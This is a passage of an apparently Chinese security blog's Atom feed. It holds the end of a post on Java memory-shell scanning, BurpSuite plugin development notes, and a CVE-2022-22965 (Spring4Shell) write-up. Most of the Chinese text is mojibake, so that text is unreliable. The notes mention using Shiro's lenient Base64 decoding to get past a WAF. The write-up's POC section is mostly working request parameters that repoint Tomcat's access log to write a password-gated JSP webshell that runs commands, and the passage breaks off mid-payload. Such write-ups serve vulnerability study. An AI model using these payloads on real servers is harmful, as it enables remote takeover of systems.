href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></li></ol><h4 id="æ‰«æè·å–å·²æœ‰çš„filter"><a href="#æ‰«æè·å–å·²æœ‰çš„filter" class="headerlink" title="æ‰«æè·å–å·²æœ‰çš„filter"></a>æ‰«æè·å–å·²æœ‰çš„filter</h4><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a><br>é€šè¿‡åå°„è·å–StandardContexté‡Œé¢æ‰€æœ‰çš„filter, <a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servletå‹å†…å­˜é©¬çš„æ‰«ææŠ“æ•ä¸æŸ¥æ€</a>:</p><pre class="line-numbers language-none"><code class="language-none">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;  -&gt; context &#123;ApplicationContext&#125;     -&gt; context &#123;StandardContext&#125;      * filterDefs      * filterMaps      * children      * servletMappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcatæºä»£ç è°ƒè¯•ç¬”è®°-çœ‹ä¸è§çš„Shell</a></li><li><a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">å†°èæ”¹é€ ä¹‹é€‚é…åŸºäºtomcat Filterçš„æ— æ–‡ä»¶webshell </a></li><li><a href="https://www.yuque.com/ppwdd/xz9rb1/ahe2no">Javaå†…å­˜é©¬ä¸“é¢˜å¥—é¤A</a></li><li><a href="https://mp.weixin.qq.com/s/gYGrdDtIldzrE7NHSxTDYQ">TomcatåŸºäºServletçš„æ— æ–‡ä»¶webshellçš„ç›¸å…³æŠ€æœ¯ç ”ç©¶</a></li><li><a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="http://blog.nsfocus.net/webshell-interceptor/">å†…å­˜é©¬çš„æ”»é˜²åšå¼ˆä¹‹æ—…</a></li><li><a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servletå‹å†…å­˜é©¬çš„æ‰«ææŠ“æ•ä¸æŸ¥æ€</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Servlet&quot;&gt;&lt;a href=&quot;#Servlet&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/04/14/memory-shell-1/Servlet.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;å½“å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼šè¯·æ±‚ â†’ Listener â†’ Filter â†’ Servlet&lt;/p&gt;
&lt;h4 id=&quot;Listener&quot;&gt;&lt;a href=&quot;#Listener&quot; class=&quot;headerlink&quot; title=&quot;Listener&quot;&gt;&lt;/a&gt;Listener&lt;/h4&gt;&lt;p&gt;Listenerä¹Ÿç§°ä¹‹ä¸ºç›‘å¬å™¨ï¼Œå¯ä»¥ç›‘å¬Applicationã€Sessionå’ŒRequestå¯¹è±¡çš„åˆ›å»ºã€é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬å¯¹å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§äº‹ä»¶ï¼Œå¹¶è‡ªåŠ¨æ‰§è¡Œè‡ªå®šä¹‰çš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;h4 id=&quot;Filter&quot;&gt;&lt;a href=&quot;#Filter&quot; class=&quot;headerlink&quot; title=&quot;Filter&quot;&gt;&lt;/a&gt;Filter&lt;/h4&gt;&lt;p&gt;Filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œå¯ä»¥åŠ¨æ€åœ°ä¿®æ”¹HttpServletRequestï¼ŒHttpServletResponseä¸­çš„å¤´å’Œæ•°æ®ã€‚&lt;/p&gt;
&lt;h4 id=&quot;Servlet-1&quot;&gt;&lt;a href=&quot;#Servlet-1&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h4&gt;&lt;p&gt;Servletæ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚Servlet å¯ä»¥ç†è§£ä¸ºæŸä¸€ä¸ªè·¯å¾„åç»­çš„ä¸šåŠ¡å¤„ç†é€»è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;Tomcatæ˜¯httpæœåŠ¡å™¨+servletå®¹å™¨ï¼Œå½“Tomcatä½œä¸ºServletå®¹å™¨çš„æ—¶å€™ï¼Œè®²httpè¯·æ±‚æ–‡æœ¬è§£æä¹‹åå°è£…æˆ&lt;code&gt;HttpServletRequest&lt;/code&gt;ç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™Servletï¼ŒåŒæ—¶è®²ç›¸åº”çš„ä¿¡æ¯å°è£…ä¸º&lt;code&gt;HttpServletResponse&lt;/code&gt;ç±»å‹çš„responseå¯¹è±¡ï¼Œå°†responseå¯¹è±¡äº¤ç»™tomcatï¼Œtomcatæ ¼å¼åŒ–ä¹‹åè¿”å›ç»™æµè§ˆå™¨&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>BurpSuiteæ’ä»¶å¼€å‘æ³¨æ„äº‹é¡¹</title>
    <link href="https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html"/>
    <id>https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html</id>
    <published>2022-04-10T16:00:00.000Z</published>
    <updated>2022-04-12T10:22:40.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-Base64çš„å‘"><a href="#0x1-Base64çš„å‘" class="headerlink" title="0x1. Base64çš„å‘"></a>0x1. Base64çš„å‘</h2><p>åœ¨JDK8ç‰ˆæœ¬é‡Œé¢ï¼ŒJavaè‡ªå¸¦çš„<code>java.util.Base64</code>æ˜¯æ ¹æ®RFC4648å’ŒRFC2045å®ç°çš„ï¼Œä½†æ˜¯JDK7é‡Œé¢çš„<code>sun.misc.BASE64Encoder</code>ï¼Œæ˜¯RFC1521å®ç°çš„ã€‚<br>è¿™ä¼šå¯¼è‡´<code>java.util.Base64</code>è§£ç JDK7ç‰ˆæœ¬çš„Base64å‘ç”Ÿé”™è¯¯ï¼š<code>Illegal base64 character</code>ã€‚</p><p>å¯ä»¥ä½¿ç”¨shiroçš„Base64è§£å†³ï¼Œå¢åŠ mavenä¾èµ–:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>shiro<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS: chybetaå¸ˆå‚…åœ¨æ¼æ´ç™¾å‡ºé‡Œé¢æå‡ºè¿‡ï¼ŒShiroåœ¨Base64è§£ç çš„æ—¶å€™ä¼šä¸¢å¼ƒéBase64å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡WAFé˜²ç«å¢™ï¼Œæ¯”å¦‚å¡«å……åƒåœ¾å­—ç¬¦ä¸²ã€‚</p><h2 id="0x2-RSAå…¬ç§é’¥"><a href="#0x2-RSAå…¬ç§é’¥" class="headerlink" title="0x2. RSAå…¬ç§é’¥"></a>0x2. RSAå…¬ç§é’¥</h2><p>PythonåŠ è§£å¯†çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯PKCS#1æ ¼å¼çš„å…¬ç§é’¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none"># å…¬é’¥-----BEGIN RSA PUBLIC KEY----------END RSA PUBLIC KEY-----  # ç§é’¥-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯åœ¨Javaé‡Œé¢éœ€è¦ä½¿ç”¨PKCS#8æ ¼å¼:</p><pre class="line-numbers language-none"><code class="language-none"># å…¬é’¥-----BEGIN PUBLIC KEY----------END PUBLIC KEY-----  # ç§é’¥-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PKCS#1ç§é’¥è½¬æ¢ä¸ºPKCS#8æ ¼å¼: <code>openssl pkcs8 -topk8 -inform PEM -in rsa_private.pem -outform pem -nocrypt -out pkcs8.pem</code></p><p>RSAæ ¹æ®PKCS#8ç§é’¥ç”Ÿæˆå…¬é’¥:  <code>openssl rsa -in pkcs8.pem -out rsa_public.pem -pubout</code></p><h2 id="0x3-æ’ä»¶æ‰“åŒ…"><a href="#0x3-æ’ä»¶æ‰“åŒ…" class="headerlink" title="0x3. æ’ä»¶æ‰“åŒ…"></a>0x3. æ’ä»¶æ‰“åŒ…</h2><p>åœ¨æ’ä»¶å¼€å‘å®Œæˆä¹‹åï¼Œå¦‚æœä¾èµ–æœ‰ç¬¬ä¸‰æ–¹çš„JaråŒ…ï¼Œéœ€è¦æŠŠç¬¬ä¸‰æ–¹çš„ä¾èµ–ä¹Ÿæ‰“åŒ…è¿›å»ï¼Œä¿®æ”¹pom.xmlæ–‡ä»¶çš„buildæ¨¡å—ï¼ŒåŠ å…¥mavençš„æ’ä»¶é…ç½®:</p><pre class="line-numbers language-none"><code class="language-none">&lt;build&gt;       &lt;plugins&gt;           &lt;plugin&gt;               &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;               &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;source&gt;8&lt;&#x2F;source&gt;                   &lt;target&gt;8&lt;&#x2F;target&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;           &lt;plugin&gt;               &lt;artifactId&gt;maven-assembly-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;archive&gt;                       &lt;manifest&gt;                           &lt;mainClass&gt;burp.BurpExtender&lt;&#x2F;mainClass&gt;                       &lt;&#x2F;manifest&gt;                   &lt;&#x2F;archive&gt;                   &lt;descriptorRefs&gt;                       &lt;descriptorRef&gt;jar-with-dependencies&lt;&#x2F;descriptorRef&gt;                   &lt;&#x2F;descriptorRefs&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;       &lt;&#x2F;plugins&gt;   &lt;&#x2F;build&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰“åŒ…æ’ä»¶:</p><pre class="line-numbers language-none"><code class="language-none">mvn clean mvn clean compile assembly:single  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x4-æ’ä»¶è°ƒè¯•"><a href="#0x4-æ’ä»¶è°ƒè¯•" class="headerlink" title="0x4. æ’ä»¶è°ƒè¯•"></a>0x4. æ’ä»¶è°ƒè¯•</h2><p>åœ¨å¼€å‘æ’ä»¶çš„æ—¶å€™ï¼Œå¦‚æœéœ€è¦å¯¹æ’ä»¶å®æ—¶è°ƒè¯•ï¼Œå¯ä»¥é€‰æ‹©å…ˆåœ¨å®˜ç½‘ä¸‹è½½å®‰è£…ç¤¾åŒºç‰ˆæœ¬çš„BurpSuiteï¼Œç„¶åå¯åŠ¨Burpsuite:</p><pre class="line-numbers language-none"><code class="language-none">java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005 -jar burpsuite_community.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ–°å¢è¿œç¨‹è°ƒè¯•:<br><img src="/2022/04/11/burpsuite-ext-dev/1.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-Base64çš„å‘&quot;&gt;&lt;a href=&quot;#0x1-Base64çš„å‘&quot; class=&quot;headerlink&quot; title=&quot;0x1. Base64çš„å‘&quot;&gt;&lt;/a&gt;0x1. Base64çš„å‘&lt;/h2&gt;&lt;p&gt;åœ¨JDK8ç‰ˆæœ¬é‡Œé¢ï¼ŒJavaè‡ªå¸¦çš„&lt;code&gt;java.util.Base64&lt;/code&gt;æ˜¯æ ¹æ®RFC4648å’ŒRFC2045å®ç°çš„ï¼Œä½†æ˜¯JDK7é‡Œé¢çš„&lt;code&gt;sun.misc.BASE64Encoder&lt;/code&gt;ï¼Œæ˜¯RFC1521å®ç°çš„ã€‚&lt;br&gt;è¿™ä¼šå¯¼è‡´&lt;code&gt;java.util.Base64&lt;/code&gt;è§£ç JDK7ç‰ˆæœ¬çš„Base64å‘ç”Ÿé”™è¯¯ï¼š&lt;code&gt;Illegal base64 character&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨shiroçš„Base64è§£å†³ï¼Œå¢åŠ mavenä¾èµ–:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;groupId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;core&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;artifactId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;version&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;dependency&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PS: chybetaå¸ˆå‚…åœ¨æ¼æ´ç™¾å‡ºé‡Œé¢æå‡ºè¿‡ï¼ŒShiroåœ¨Base64è§£ç çš„æ—¶å€™ä¼šä¸¢å¼ƒéBase64å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡WAFé˜²ç«å¢™ï¼Œæ¯”å¦‚å¡«å……åƒåœ¾å­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x2-RSAå…¬ç§é’¥&quot;&gt;&lt;a href=&quot;#0x2-RSAå…¬ç§é’¥&quot; class=&quot;headerlink&quot; title=&quot;0x2. RSAå…¬ç§é’¥&quot;&gt;&lt;/a&gt;0x2. RSAå…¬ç§é’¥&lt;/h2&gt;&lt;p&gt;PythonåŠ è§£å¯†çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯PKCS#1æ ¼å¼çš„å…¬ç§é’¥ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# å…¬é’¥
-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----
  
# ç§é’¥
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½†æ˜¯åœ¨Javaé‡Œé¢éœ€è¦ä½¿ç”¨PKCS#8æ ¼å¼:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# å…¬é’¥
-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----
  
# ç§é’¥
-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-22965æ¼æ´è®°å½•</title>
    <link href="https://jkme.github.io/2022/04/06/CVE-2022-22965.html"/>
    <id>https://jkme.github.io/2022/04/06/CVE-2022-22965.html</id>
    <published>2022-04-05T16:00:00.000Z</published>
    <updated>2022-04-12T09:51:19.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´æ—¶é—´çº¿"><a href="#æ¼æ´æ—¶é—´çº¿" class="headerlink" title="æ¼æ´æ—¶é—´çº¿"></a>æ¼æ´æ—¶é—´çº¿</h2><ul><li><p>CVE-2010-1622 Springç¬¬ä¸€æ¬¡<a href="https://www.inbreak.net/archives/377">çˆ†å‘æ¼æ´</a>ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p></li><li><p>2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§</p></li><li><p>2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰</p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li><p>CVE-2010-1622/Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token 